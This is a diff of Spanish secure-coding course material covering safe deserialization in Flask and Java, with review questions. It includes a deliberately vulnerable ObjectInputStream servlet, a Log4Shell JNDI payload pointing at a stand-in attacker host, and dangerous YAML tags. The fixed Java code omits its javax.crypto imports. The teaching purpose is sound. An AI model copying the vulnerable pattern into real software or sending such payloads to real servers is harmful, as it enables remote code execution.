+def sign_data(data: Dict[str, Any]) -> str:
+    """Firma los datos con HMAC-SHA256 para detectar manipulacion"""
+    serialized = json.dumps(data, sort_keys=True, separators=(',', ':'))
+    signature = hmac.new(
+        SECRET_KEY.encode('utf-8'),
+        serialized.encode('utf-8'),
+        hashlib.sha256
+    ).hexdigest()
+    return signature
+
+
+def verify_signature(data: Dict[str, Any], signature: str) -> bool:
+    """Verifica la firma de los datos"""
+    expected = sign_data(data)
+    # Usar compare_digest para prevenir timing attacks
+    return hmac.compare_digest(expected, signature)
 
 
 # ============================================================
-# EJEMPLO DE USO EN FLASK
+# API SEGURA
 # ============================================================
 
-@app.before_request
-def before_request():
-    """Genera un request_id unico para tracking"""
-    g.request_id = uuid.uuid4().hex[:16]
-    g.start_time = datetime.now()
-
-
-@app.after_request
-def after_request(response):
-    """Log de todas las requests (sin datos sensibles)"""
-    if hasattr(g, 'start_time'):
-        elapsed = (datetime.now() - g.start_time).total_seconds()
-
-        # Solo loggear informacion basica, NO el body completo
-        secure_logger.logger.info(
-            f"Request: {request.method} {request.path} -> {response.status_code} ({elapsed:.3f}s)",
-            extra={'extra_data': {
-                'request_id': getattr(g, 'request_id', ''),
-                'method': request.method,
-                'path': request.path,
-                'status': response.status_code,
-                'elapsed': f"{elapsed:.3f}s",
-                'ip': request.remote_addr,
-                # NO incluir: request.data, request.args, request.form (pueden tener datos sensibles)
-            }}
-        )
-    return response
-
-
-@app.route('/login', methods=['POST'])
-def login():
+@app.route('/api/session/create', methods=['POST'])
+def create_session():
+    """Crea una sesion segura firmada"""
     data = request.get_json()
 
-    # NUNCA loguear la contrasena
-    secure_logger.auth_event(
-        event_type='login',
-        user_id=data.get('username', 'unknown'),
-        success=True,  # Simplificado para el ejemplo
-        ip=request.remote_addr,
-        context={
-            'username': data.get('username', ''),
-            'user_agent': request.headers.get('User-Agent', ''),
-            # password NO se incluye
-        }
-    )
-    return {'mensaje': 'Login exitoso'}
+    if not data:
+        return jsonify({'error': 'Datos invalidos'}), 400
+
+    # Validar esquema
+    if not validate_session_data(data):
+        return jsonify({'error': 'Datos de sesion invalidos'}), 400
+
+    if not validate_extra_data(data):
+        return jsonify({'error': 'Campos adicionales no permitidos'}), 400
+
+    try:
+        # Serializar a JSON
+        serialized = json.dumps(data, separators=(',', ':'))
+
+        # Firmar los datos
+        signature = sign_data(data)
+
+        # Devolver token seguro
+        return jsonify({
+            'token': serialized,
+            'signature': signature,
+            'format': 'json_signed',
+            'mensaje': 'Sesion creada de forma segura'
+        })
+
+    except Exception as e:
+        return jsonify({'error': f'Error creando sesion: {str(e)}'}), 500
 
 
-@app.route('/api/datos-sensibles')
-def datos_sensibles():
-    # Probar que el filtro funciona
-    password = "admin123"
-    token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0"
-    credit_card = "4532-1234-5678-9012"
+@app.route('/api/session/verify', methods=['POST'])
+def verify_session():
+    """Verifica y deserializa una sesion segura"""
+    data = request.get_json()
+    token = data.get('token', '') if data else ''
+    signature = data.get('signature', '') if data else ''
 
-    logger.warning(f"Debug: password={password}, token={token}, card={credit_card}")
-    # En logs: password=[REDACTED_password], token=[REDACTED_password], card=[REDACTED_credit_card]
+    if not token or not signature:
+        return jsonify({'error': 'Token y signature requeridos'}), 400
 
-    return {'mensaje': 'Revisar logs - datos sensibles deben estar redactados'}
+    try:
+        # 1. Deserializar JSON
+        session_data = json.loads(token)
+
+        # 2. Verificar que es un diccionario
+        if not isinstance(session_data, dict):
+            return jsonify({'error': 'Formato de token invalido'}), 400
+
+        # 3. Verificar firma
+        if not verify_signature(session_data, signature):
+            return jsonify({'error': 'Firma invalida - token manipulado'}), 403
+
+        # 4. Validar esquema
+        if not validate_session_data(session_data):
+            return jsonify({'error': 'Datos de sesion invalidos'}), 400
+
+        # 5. Validar campos extra
+        if not validate_extra_data(session_data):
+            return jsonify({'error': 'Campos adicionales no permitidos'}), 400
+
+        return jsonify({
+            'valid': True,
+            'session': {
+                'username': session_data['username'],
+                'user_id': session_data['user_id'],
+                'role': session_data['role'],
+            },
+            'mensaje': 'Sesion verificada correctamente'
+        })
+
+    except json.JSONDecodeError:
+        return jsonify({'error': 'JSON invalido'}), 400
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+
+@app.route('/api/session/info')
+def session_info():
+    """Endpoint informativo"""
+    return jsonify({
+        'formato': 'JSON con validacion de esquema y firma HMAC-SHA256',
+        'campos_permitidos': list(SESSION_SCHEMA.keys()),
+        'roles_permitidos': list(ROLES_PERMITIDOS),
+        'mitigaciones': [
+            'Formato JSON (no ejecuta codigo)',
+            'Validacion de esquema estricta (tipos y valores)',
+            'Firma HMAC-SHA256 contra manipulacion',
+            'Rechazo de campos adicionales',
+            'Validacion de roles permitidos',
+        ]
+    })
+
+
+# ============================================================
+# PRUEBAS
+# ============================================================
+
+def run_tests():
+    """Pruebas automatizadas"""
+    import requests
+
+    base = "http://127.0.0.1:5000"
+
+    def test(name, endpoint, data, expected_status):
+        r = requests.post(f"{base}{endpoint}", json=data)
+        status = "PASS" if r.status_code == expected_status else "FAIL"
+        print(f"[{status}] {name} (status: {r.status_code}, esperado: {expected_status})")
+        if status == "FAIL":
+            print(f"  Respuesta: {r.text[:100]}")
+        return r
+
+    # Test 1: Crear sesion valida
+    test("Crear sesion valida", "/api/session/create", {
+        'username': 'juanperez',
+        'user_id': 123,
+        'role': 'user',
+        'email': 'juan@example.com',
+        'created_at': '2024-01-15T10:30:00',
+    }, 200)
+
+    # Test 2: Sesion con rol invalido
+    test("Rol invalido", "/api/session/create", {
+        'username': 'admin',
+        'user_id': 1,
+        'role': 'superadmin',
+        'email': 'admin@test.com',
+        'created_at': '2024-01-15',
+    }, 400)
+
+    # Test 3: Sesion con campo adicional
+    test("Campo adicional", "/api/session/create", {
+        'username': 'test',
+        'user_id': 1,
+        'role': 'user',
+        'email': 'test@test.com',
+        'created_at': '2024-01-15',
+        'is_admin': True,  # Campo no permitido
+    }, 400)
+
+    # Test 4: Tipo incorrecto
+    test("Tipo incorrecto en user_id", "/api/session/create", {
+        'username': 'test',
+        'user_id': 'abc',  # Deberia ser int
+        'role': 'user',
+        'email': 'test@test.com',
+        'created_at': '2024-01-15',
+    }, 400)
+
+    # Test 5: Verificar sesion con firma correcta
+    r = test("Crear sesion para verificar", "/api/session/create", {
+        'username': 'testuser',
+        'user_id': 456,
+        'role': 'viewer',
+        'email': 'viewer@example.com',
+        'created_at': '2024-06-01',
+    }, 200)
+
+    if r.status_code == 200:
+        data = r.json()
+        test("Verificar sesion con firma valida", "/api/session/verify", {
+            'token': data['token'],
+            'signature': data['signature'],
+        }, 200)
+
+        # Test 6: Verificar con firma invalida
+        test("Verificar sesion con firma invalida", "/api/session/verify", {
+            'token': data['token'],
+            'signature': 'firma_invalida',
+        }, 403)
 
 
 if __name__ == '__main__':
-    print("=== DEMOSTRACION DE LOGGER SEGURO ===\n")
-
-    # Demostracion de eventos
-    secure_logger.auth_event('login', 'user123', True, '192.168.1.1')
-    secure_logger.auth_event('login', 'user456', False, '10.0.0.1',
-                            {'reason': 'contrasena_incorrecta'})
-    secure_logger.access_denied('user789', '/api/admin/users', 'delete',
-                                '192.168.1.100', 'rol_insuficiente')
-    secure_logger.data_change('admin', 'user', '123', 'update_role',
-                              {'new_role': 'admin', 'old_role': 'user'})
-    secure_logger.security_alert('brute_force', 'HIGH',
-                                 'Multiple login failures detected',
-                                 {'attempts': 50, 'ip': '10.0.0.50', 'timeframe': '5min'})
-
-    # Demostrar redaccion de datos sensibles
-    print("\n=== Prueba de redaccion de datos sensibles ===")
-    secure_logger.logger.warning("Contrasena incorrecta: password='miPass123' para usuario admin",
-                                extra={'extra_data': {}})
-
-    # Iniciar servidor Flask
-    print("\n=== Iniciando servidor Flask ===")
-    app.run(host='127.0.0.1', port=5000)
+    app.run(host='127.0.0.1', port=5000, debug=False)
 ```
 
 ---
 
-## Ejercicio 3: Crear un SBOM Simple para un Proyecto
+## Ejercicio 3: Deserializacion Segura en Java con Validacion
 
 ### Escenario
 
-Crear un generador de SBOM que analice dependencias de un proyecto Python y genere el inventario en formato SPDX.
+Dado codigo Java que usa ObjectInputStream para deserializar datos de usuario, escribir una version segura con validacion.
 
-```python
-"""
-sbom_generator.py - Generador simple de SBOM
-"""
-import json
-import hashlib
-import os
-from datetime import datetime, timezone
-from typing import Dict, List
-import pkg_resources
-import re
+**Codigo vulnerable original:**
 
+```java
+// VulnerableServlet.java
+import java.io.*;
+import javax.servlet.*;
+import javax.servlet.http.*;
+import javax.json.*;
 
-class SBOMGenerator:
-    """
-    Genera un Software Bill of Materials (SBOM) en formato SPDX
-    para un proyecto Python.
-    """
+public class VulnerableServlet extends HttpServlet {
 
-    def __init__(self, project_name: str, project_version: str = "1.0.0"):
-        self.project_name = project_name
-        self.project_version = project_version
-        self.packages = {}
+    protected void doPost(HttpServletRequest req, HttpServletResponse resp)
+            throws ServletException, IOException {
 
-    def scan_installed_packages(self):
-        """
-        Escanea los paquetes instalados en el entorno actual.
-        En produccion, leer requirements.txt o poetry.lock en su lugar.
-        """
-        for dist in pkg_resources.working_set:
-            self.packages[dist.key] = {
-                'name': dist.key,
-                'version': dist.version,
-                'summary': getattr(dist, 'summary', ''),
-                'home_page': getattr(dist, 'home_page', ''),
-                'license': getattr(dist, 'license', ''),
-            }
+        // Leer datos serializados del request
+        byte[] data = req.getInputStream().readAllBytes();
 
-    def scan_requirements_file(self, filepath: str):
-        """Escanea dependencias desde requirements.txt"""
-        if not os.path.exists(filepath):
-            print(f"Archivo no encontrado: {filepath}")
-            return
+        // VULNERABLE: Deserializa directamente sin validacion
+        try (ByteArrayInputStream bis = new ByteArrayInputStream(data);
+             ObjectInputStream ois = new ObjectInputStream(bis)) {
 
-        with open(filepath, 'r') as f:
-            for line in f:
-                line = line.strip()
-                if line and not line.startswith('#') and not line.startswith('-'):
-                    match = re.match(r'([a-zA-Z0-9_.-]+)\s*([><=!]+)\s*([\d.*]+)', line)
-                    if match:
-                        name = match.group(1).lower()
-                        version = match.group(3)
-                        if name not in self.packages:
-                            self.packages[name] = {
-                                'name': name,
-                                'version': version,
-                                'summary': '',
-                                'home_page': '',
-                                'license': 'NOASSERTION',
-                            }
+            Object obj = ois.readObject();  // Puede ejecutar codigo arbitrario
+            resp.getWriter().println("Objeto deserializado: " + obj);
 
-    def generate_spdx(self) -> Dict:
-        """Genera el SBOM en formato SPDX 2.3"""
-        now = datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')
-
-        spdx = {
-            'spdxVersion': 'SPDX-2.3',
-            'dataLicense': 'CC0-1.0',
-            'SPDXID': 'SPDXRef-DOCUMENT',
-            'name': f'{self.project_name}-{self.project_version}',
-            'creationInfo': {
-                'created': now,
-                'creators': [
-                    f'Tool: SBOMGenerator-1.0',
-                    f'Organization: MiOrganizacion',
-                ],
-            },
-            'documentNamespace': f'https://spdx.org/spdxdocs/{self.project_name}-{self.project_version}-{hashlib.md5(now.encode()).hexdigest()}',
-            'packages': [],
-            'relationships': [],
+        } catch (ClassNotFoundException e) {
+            resp.getWriter().println("Error: Clase no encontrada");
         }
+    }
+}
+```
 
-        for pkg_name, pkg_info in self.packages.items():
-            pkg_spdxid = f'SPDXRef-Package-{pkg_name}'
+**Version corregida con validacion:**
 
-            pkg_entry = {
-                'name': pkg_name,
-                'SPDXID': pkg_spdxid,
-                'versionInfo': pkg_info['version'],
-                'supplier': 'NOASSERTION',
-                'downloadLocation': pkg_info.get('home_page', 'NOASSERTION'),
-                'licenseDeclared': self._normalize_license(pkg_info.get('license', 'NOASSERTION')),
-                'copyrightText': 'NOASSERTION',
-                'summary': pkg_info.get('summary', '')[:200] if pkg_info.get('summary') else 'NOASSERTION',
-                'externalRefs': [
-                    {
-                        'referenceCategory': 'PACKAGE-MANAGER',
-                        'referenceType': 'purl',
-                        'referenceLocator': f'pkg:pypi/{pkg_name}@{pkg_info["version"]}'
-                    }
-                ],
-            }
+```java
+// SafeDeserializationServlet.java
+import java.io.*;
+import java.security.*;
+import java.util.*;
+import javax.servlet.*;
+import javax.servlet.http.*;
+import com.google.gson.*;
 
-            # Si tiene checksum (archivo)
-            spdx['packages'].append(pkg_entry)
+public class SafeDeserializationServlet extends HttpServlet {
 
-            # Relacion: proyecto depende del paquete
-            spdx['relationships'].append({
-                'spdxElementId': 'SPDXRef-DOCUMENT',
-                'relationshipType': 'DESCRIBES',
-                'relatedSpdxElement': pkg_spdxid,
-            })
+    // Lista blanca de clases permitidas para deserializar
+    private static final Set<String> ALLOWED_CLASSES = Set.of(
+        "java.lang.String",
+        "java.lang.Integer",
+        "java.lang.Long",
+        "java.lang.Boolean",
+        "java.lang.Double",
+        "java.util.ArrayList",
+        "java.util.HashMap",
+        "java.util.HashSet",
+        "com.miapp.model.Usuario",
+        "com.miapp.model.Sesion"
+    );
 
-        return spdx
-
-    def _normalize_license(self, license_str: str) -> str:
-        """Normaliza nombres de licencias a formato SPDX"""
-        if not license_str or license_str == 'UNKNOWN':
-            return 'NOASSERTION'
-
-        license_map = {
-            'MIT License': 'MIT',
-            'Apache Software License': 'Apache-2.0',
-            'BSD License': 'BSD-3-Clause',
-            'GNU General Public License v2 or later (GPLv2+)': 'GPL-2.0-or-later',
-            'GNU General Public License v3 or later (GPLv3+)': 'GPL-3.0-or-later',
-            'Python Software Foundation License': 'PSF-2.0',
-            'Mozilla Public License 2.0 (MPL 2.0)': 'MPL-2.0',
+    // Clave secreta para verificar firmas
+    private static final String HMAC_KEY = System.getenv("SERIALIZATION_KEY");
+    static {
+        if (HMAC_KEY == null || HMAC_KEY.isEmpty()) {
+            throw new RuntimeException("SERIALIZATION_KEY no configurada");
         }
-
-        return license_map.get(license_str, license_str)
-
-    def save_spdx(self, filepath: str = 'sbom.json'):
-        """Guarda el SBOM en un archivo JSON"""
-        spdx = self.generate_spdx()
-        with open(filepath, 'w', encoding='utf-8') as f:
-            json.dump(spdx, f, indent=2, ensure_ascii=False)
-        print(f"SBOM generado: {filepath}")
-
-    def save_cyclonedx(self, filepath: str = 'sbom.cyclonedx.json'):
-        """Genera SBOM en formato CycloneDX (simplificado)"""
-        now = datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')
-
-        cyclonedx = {
-            '$schema': 'http://cyclonedx.org/schema/bom-1.5.schema.json',
-            'bomFormat': 'CycloneDX',
-            'specVersion': '1.5',
-            'serialNumber': f'urn:uuid:{hashlib.md5(now.encode()).hexdigest()}',
-            'version': 1,
-            'metadata': {
-                'timestamp': now,
-                'tools': [{
-                    'vendor': 'MiOrganizacion',
-                    'name': 'SBOMGenerator',
-                    'version': '1.0',
-                }],
-                'component': {
-                    'type': 'application',
-                    'name': self.project_name,
-                    'version': self.project_version,
-                    'bom-ref': self.project_name,
-                }
-            },
-            'components': [],
-        }
-
-        for pkg_name, pkg_info in self.packages.items():
-            cyclonedx['components'].append({
-                'type': 'library',
-                'name': pkg_name,
-                'version': pkg_info['version'],
-                'purl': f'pkg:pypi/{pkg_name}@{pkg_info["version"]}',
-                'bom-ref': f'pkg:{pkg_name}@{pkg_info["version"]}',
-                'licenses': [{
-                    'license': {
-                        'name': self._normalize_license(pkg_info.get('license', 'NOASSERTION'))
-                    }
-                }] if pkg_info.get('license') else [],
-            })
-
-        with open(filepath, 'w', encoding='utf-8') as f:
-            json.dump(cyclonedx, f, indent=2, ensure_ascii=False)
-        print(f"SBOM (CycloneDX) generado: {filepath}")
-
-
-# ============================================================
-# USO
-# ============================================================
-
-def generate_sbom_for_project():
-    """Genera SBOM para el proyecto actual"""
-    generator = SBOMGenerator(
-        project_name="MiApp",
-        project_version="2.1.0"
-    )
-
-    # Escanear paquetes instalados
-    print("Escaneando paquetes instalados...")
-    generator.scan_installed_packages()
-
-    # Si hay requirements.txt, escanearlo tambien
-    req_file = 'requirements.txt'
-    if os.path.exists(req_file):
-        print(f"Escaneando dependencias desde {req_file}...")
-        generator.scan_requirements_file(req_file)
-
-    # Generar SBOM en formato SPDX
-    print("\nGenerando SBOM...")
-    generator.save_spdx('sbom_spdx.json')
-
-    # Generar SBOM en formato CycloneDX
-    generator.save_cyclonedx('sbom_cyclonedx.json')
-
-    # Mostrar resumen
-    print(f"\nResumen:")
-    print(f"  Total paquetes: {len(generator.packages)}")
-    print(f"  Licencias unicas: {len(set(p.get('license', 'UNKNOWN') for p in generator.packages.values()))}")
-
-    # Verificar vulnerabilidades conocidas en los paquetes
-    total_vulns = check_vulnerabilities(generator.packages)
-    print(f"  Posibles vulnerabilidades: {total_vulns}")
-
-    return generator.packages
-
-
-def check_vulnerabilities(packages: Dict) -> int:
-    """Verifica vulnerabilidades conocidas (simplificado)"""
-    # En produccion, esto consultaria la API de Snyk o la base de datos NVD
-    known_vulnerable = {
-        'flask': ['1.0', '1.0.1', '1.0.2', '2.0', '2.1'],
-        'requests': ['2.20.0', '2.21.0', '2.22.0'],
-        'django': ['2.2', '2.2.1', '3.0', '3.1'],
-        'urllib3': ['1.24.1', '1.25', '1.26.0'],
-        'pyyaml': ['5.1', '5.2', '5.3'],
     }
 
-    vuln_count = 0
-    for pkg_name, pkg_info in packages.items():
-        if pkg_name in known_vulnerable:
-            if pkg_info['version'] in known_vulnerable[pkg_name]:
-                print(f"  [!] {pkg_name} {pkg_info['version']} - POSIBLE VULNERABLE")
-                vuln_count += 1
+    @Override
+    protected void doPost(HttpServletRequest req, HttpServletResponse resp)
+            throws ServletException, IOException {
 
-    return vuln_count
+        resp.setContentType("application/json");
+        PrintWriter out = resp.getWriter();
 
+        try {
+            // Opcion 1: Usar JSON en lugar de serializacion nativa
+            String jsonBody = new String(req.getInputStream().readAllBytes(), "UTF-8");
+            Gson gson = new Gson();
 
-if __name__ == '__main__':
-    print("=" * 60)
-    print("GENERADOR DE SBOM")
-    print("=" * 60)
+            // Validar estructura basica
+            JsonObject json = JsonParser.parseString(jsonBody).getAsJsonObject();
 
-    packages = generate_sbom_for_project()
+            // Validar campos requeridos
+            if (!json.has("type") || !json.has("data") || !json.has("signature")) {
+                out.println("{\"error\": \"Campos requeridos faltantes\"}");
+                resp.setStatus(400);
+                return;
+            }
 
-    # Mostrar primeros paquetes
-    print(f"\nPrimeros 10 paquetes:")
-    for i, (name, info) in enumerate(sorted(packages.items())[:10]):
-        print(f"  {i+1}. {name} == {info['version']} ({info.get('license', 'N/A')})")
+            String type = json.get("type").getAsString();
+            String data = json.get("data").toString();
+            String signature = json.get("signature").getAsString();
+
+            // Verificar firma
+            if (!verifyHMAC(data, signature)) {
+                out.println("{\"error\": \"Firma invalida\"}");
+                resp.setStatus(403);
+                return;
+            }
+
+            // Deserializar segun tipo
+            Object result;
+            switch (type) {
+                case "usuario":
+                    Usuario user = gson.fromJson(data, Usuario.class);
+                    result = user;
+                    break;
+                case "sesion":
+                    Sesion sesion = gson.fromJson(data, Sesion.class);
+                    result = sesion;
+                    break;
+                default:
+                    out.println("{\"error\": \"Tipo no soportado\"}");
+                    resp.setStatus(400);
+                    return;
+            }
+
+            out.println("{\"success\": true, \"data\": " + gson.toJson(result) + "}");
+
+        } catch (Exception e) {
+            out.println("{\"error\": \"Error deserializando datos\"}");
+            resp.setStatus(500);
+        }
+    }
+
+    /**
+     * Metodo seguro con ObjectInputStream + LookAheadObjectInputStream
+     * para cuando se debe usar serializacion nativa de Java
+     */
+    public static Object safeDeserialize(byte[] data) throws Exception {
+        try (ByteArrayInputStream bis = new ByteArrayInputStream(data);
+             LookAheadObjectInputStream laois = new LookAheadObjectInputStream(bis)) {
+
+            Object obj = laois.readObject();
+            return obj;
+        }
+    }
+
+    /**
+     * LookAheadObjectInputStream implementa lista blanca de clases
+     * para prevenir ataques de deserializacion con gadget chains
+     */
+    static class LookAheadObjectInputStream extends ObjectInputStream {
+
+        public LookAheadObjectInputStream(InputStream in) throws IOException {
+            super(in);
+            // Activar filtro de clases si disponible (Java 9+)
+            if (ObjectInputFilter.Config.getSerialFilter() == null) {
+                ObjectInputFilter filter = info -> {
+                    Class<?> clazz = info.serialClass();
+                    if (clazz != null) {
+                        if (ALLOWED_CLASSES.contains(clazz.getName())) {
+                            return ObjectInputFilter.Status.ALLOWED;
+                        }
+                        return ObjectInputFilter.Status.REJECTED;
+                    }
+                    return ObjectInputFilter.Status.UNDECIDED;
+                };
+                this.setObjectInputFilter(filter);
+            }
+        }
+
+        @Override
+        protected Class<?> resolveClass(ObjectStreamClass desc)
+                throws IOException, ClassNotFoundException {
+
+            String className = desc.getName();
+
+            // Verificar lista blanca antes de cargar la clase
+            if (!ALLOWED_CLASSES.contains(className)) {
+                throw new InvalidClassException(
+                    "Clase no permitida para deserializacion", className);
+            }
+
+            return super.resolveClass(desc);
+        }
+
+        @Override
+        protected Object resolveObject(Object obj) throws IOException {
+            // Validar el objeto despues de deserializar
+            if (obj != null) {
+                validateObject(obj);
+            }
+            return super.resolveObject(obj);
+        }
+
+        private void validateObject(Object obj) {
+            // Validaciones especificas por tipo
+            if (obj instanceof Usuario) {
+                Usuario user = (Usuario) obj;
+                if (user.getId() <= 0) {
+                    throw new SecurityException("ID de usuario invalido");
+                }
+                if (user.getRole() == null) {
+                    throw new SecurityException("Rol de usuario requerido");
+                }
+            }
+        }
+    }
+
+    private boolean verifyHMAC(String data, String signature) {
+        try {
+            Mac mac = Mac.getInstance("HmacSHA256");
+            SecretKeySpec keySpec = new SecretKeySpec(
+                HMAC_KEY.getBytes("UTF-8"), "HmacSHA256");
+            mac.init(keySpec);
+            byte[] expected = mac.doFinal(data.getBytes("UTF-8"));
+            String expectedHex = bytesToHex(expected);
+            return MessageDigest.isEqual(
+                expectedHex.getBytes(), signature.getBytes());
+        } catch (Exception e) {
+            return false;
+        }
+    }
+
+    private String bytesToHex(byte[] bytes) {
+        StringBuilder sb = new StringBuilder();
+        for (byte b : bytes) {
+            sb.append(String.format("%02x", b));
+        }
+        return sb.toString();
+    }
+
+    // Clases de ejemplo
+    static class Usuario implements Serializable {
+        private int id;
+        private String username;
+        private String role;
+
+        public int getId() { return id; }
+        public String getRole() { return role; }
+    }
+
+    static class Sesion implements Serializable {
+        private String sessionId;
+        private long expiresAt;
+        private int userId;
+    }
+}
 ```
+
+**Principios de seguridad aplicados:**
+
+1. **Usar JSON en vez de serializacion nativa de Java** cuando sea posible
+2. **Lista blanca de clases** en `resolveClass()` - solo clases conocidas
+3. **Validacion posterior** de los objetos deserializados
+4. **Firma HMAC** para verificar integridad y autenticidad
+5. **ObjectInputFilter** (Java 9+) para filtrado adicional
 
 ---
 
 ## Preguntas y Respuestas
 
 ### Pregunta 1
-**Que es SCA y por que es importante en el desarrollo de software?**
+**Por que pickle es peligroso y cuando deberia usarse?**
 
-**Respuesta:** SCA (Software Composition Analysis) es el proceso de identificar y gestionar riesgos en componentes de terceros (open source, librerias comerciales). Es importante porque las aplicaciones modernas usan 50-200+ dependencias, cada una con su propio conjunto de vulnerabilidades. Sin SCA, el equipo de desarrollo no tiene visibilidad de que componentes estan usando, que vulnerabilidades tienen, ni cuando deben actualizarlos. SCA automatiza la deteccion de componentes vulnerables, licencias conflictivas, y genera alertas cuando se descubren nuevas vulnerabilidades en dependencias existentes.
+**Respuesta:** pickle es peligroso porque ejecuta codigo arbitrario durante la deserializacion. El metodo `__reduce__` permite especificar cualquier funcion y argumentos, por lo que `pickle.loads()` puede ejecutar `os.system()`, `subprocess.call()`, o cualquier otra funcion. Pickle solo deberia usarse cuando: (1) los datos provienen de una fuente completamente confiable (el mismo proceso), (2) los datos nunca son expuestos al exterior, (3) no hay posibilidad de que un atacante modifique los datos serializados. En cualquier otro caso, usar JSON, MessagePack, o Protocol Buffers.
 
 ### Pregunta 2
-**Que datos NUNCA deben registrarse en logs y por que?**
+**Que son las gadget chains en Java deserialization?**
 
-**Respuesta:** Jamas deben registrarse: (1) contrasenas en texto plano (riesgo de compromiso de cuentas), (2) tokens de autenticacion y API keys (permite acceso no autorizado), (3) datos de tarjetas de credito (viola PCI DSS), (4) datos biometricos y de salud (viola HIPAA, GDPR), (5) secretos de infraestructura (claves SSH, certificados privados), (6) PII innecesaria (direcciones, DNI completos). Incluso en logs internos, si un atacante accede a los logs, obtiene estos datos. La regla es: si no es estrictamente necesario para debugging, no lo loguees. Si es necesario, ofuscalo o tokenizalo.
+**Respuesta:** Las gadget chains son secuencias de clases disponibles en el classpath que, cuando se deserializan en orden, permiten ejecutar codigo arbitrario. Cada "gadget" es una clase que realiza una accion potencialmente peligrosa durante su deserializacion (como invocar un metodo, escribir un archivo, o establecer una propiedad). Al encadenar varios gadgets, el atacante puede lograr RCE. Ejemplos famosos: CommonsCollections1 (Apache Commons Collections), Spring PropertyPathFactoryBean, JDK7u21. La mitigacion principal es mantener las librerias actualizadas y usar listas blancas de clases.
 
 ### Pregunta 3
-**Que es un SBOM y para que sirve en seguridad?**
+**Cual es la relacion entre Log4Shell y deserializacion insegura?**
 
-**Respuesta:** Un SBOM (Software Bill of Materials) es un inventario formal y estructurado de todos los componentes que conforman un software, incluyendo nombres, versiones, licencias, y relaciones de dependencia. Sirve para: (1) identificar rapidamente si una vulnerabilidad recien descubierta afecta al software, (2) gestionar licencias y cumplimiento legal, (3) facilitar auditorias de seguridad, (4) cumplir con requisitos regulatorios (EE.UU. orden ejecutiva 14028 requiere SBOM para software gubernamental), (5) mantener un inventario preciso de la superficie de ataque del software.
+**Respuesta:** Log4Shell (CVE-2021-44228) explota la funcionalidad de JNDI lookups en Log4j. Aunque no es deserializacion clasica, el atacante envia un payload como `${jndi:ldap://atacante.com/exploit}` que Log4j procesa. Log4j realiza una consulta LDAP a un servidor controlado por el atacante, que responde con una referencia a una clase Java. El cliente Log4j descarga y ejecuta esa clase, efectivamente ejecutando codigo arbitrario. Es una forma de deserializacion remota: datos no confiables (el payload en el log) desencadenan la carga y ejecucion de codigo desde una fuente externa.
 
 ### Pregunta 4
-**Cual es la diferencia entre dependencias directas y transitivas? Por que son importantes ambas?**
+**Como se valida un esquema de deserializacion segura?**
 
-**Respuesta:** Dependencias directas son las que el proyecto incluye explicitamente (ej: `pip install requests`). Dependencias transitivas son las que las dependencias directas requieren a su vez (requests depende de urllib3, que depende de...). Ambas son importantes porque: una vulnerabilidad en una dependencia transitiva (como la de Log4j en aplicaciones Java que usaban ElasticSearch o Kafka) puede comprometer toda la aplicacion. El equipo de desarrollo muchas veces no sabe que dependencias transitivas tiene. Herramientas SCA como Snyk o Dependabot analizan el arbol completo de dependencias, no solo las directas.
+**Respuesta:** La validacion de esquema debe incluir: (1) **verificacion de tipo**: cada campo debe ser del tipo esperado (str, int, float, bool, list, dict), no aceptar tipos arbitrarios, (2) **verificacion de estructura**: los campos requeridos deben estar presentes y los campos adicionales deben ser rechazados, (3) **verificacion de valores**: rangos permitidos, valores permitidos (enum), longitudes maximas, (4) **verificacion de consistencia**: relaciones entre campos (ej: fecha_inicio < fecha_fin), (5) **firma digital**: HMAC o firma asimetrica para verificar que los datos no fueron manipulados. En Python, usar `jsonschema` o validacion manual. En Java, usar Bean Validation (JSR 380) con anotaciones.
 
 ### Pregunta 5
-**Como se implementa un logging seguro en una aplicacion Flask?**
+**Es seguro usar yaml.load() en Python? Cual es la alternativa?**
 
-**Respuesta:** Para logging seguro en Flask: (1) implementar un filtro de logging que detecte y redacte patrones de datos sensibles (contrasenas, tokens, tarjetas de credito), (2) usar formato JSON estructurado para facilitar el analisis posterior, (3) nunca loguear el body completo de las requests (puede contener datos sensibles), (4) usar metodos especificos para eventos de seguridad (login, access denied, cambios de rol) que automaticamente excluyan campos sensibles, (5) configurar niveles de log apropiados (INFO para eventos normales, WARNING para sospechas, ERROR para fallos), (6) incluir un request_id unico en cada log para correlacionar eventos de una misma sesion.
+**Respuesta:** `yaml.load()` es INSEGURO porque puede ejecutar codigo arbitrario usando objetos Python personalizados. YAML permite definir tipos arbitrarios con tags `!!python/object:`, `!!python/name:`, `!!eval:`, etc. La alternativa segura es `yaml.safe_load()`, que solo acepta tipos YAML estandar (dict, list, str, int, float, bool, None). Si necesitas YAML completo (con tipos personalizados), debes implementar una lista blanca de constructores permitidos usando `yaml.add_constructor()`, similar a la lista blanca de clases en Java.
 
 ### Pregunta 6
-**Que es Log4Shell y como se relaciona con la gestion de componentes?**
+**Cuales son las mitigaciones recomendadas por OWASP contra deserializacion insegura?**
 
-**Respuesta:** Log4Shell (CVE-2021-44228) es una vulnerabilidad critica en Log4j 2.x que permite ejecucion remota de codigo sin autenticacion. La vulnerabilidad existia desde 2013 pero fue descubierta en diciembre 2021. Se relaciona con la gestion de componentes porque: (1) Log4j estaba presente en miles de aplicaciones como dependencia directa o transitiva, (2) muchas organizaciones no tenian un inventario (SBOM) de donde se usaba Log4j, (3) la correccion requirio actualizar a Log4j 2.17.0+, pero muchas aplicaciones no podian actualizar porque usaban versiones embedidas o dependencias transitivas que no se actualizaban, (4) demostro la importancia del SCA: si las organizaciones hubieran tenido visibilidad completa de sus dependencias, habrian podido responder mas rapido.
+**Respuesta:** OWASP recomienda: (1) **no aceptar datos serializados de fuentes no confiables** (la mitigacion mas efectiva), (2) **usar formatos de datos seguros** como JSON en lugar de pickle, Java serialization, o YAML, (3) **implementar listas blancas de clases** durante la deserializacion, (4) **firmar digitalmente** los datos serializados para verificar integridad, (5) **validar el esquema** de los datos despues de deserializar, (6) **deserializar en un entorno aislado** (sandbox, contenedor con minimos privilegios), (7) **monitorear y loggear** intentos de deserializacion sospechosos, (8) **mantener librerias actualizadas** para evitar gadget chains conocidas.
 
 ---
 
 ## Tarea / Lectura Recomendada
 
-1. **Leer:** OWASP Dependency Check - https://owasp.org/www-project-dependency-check/
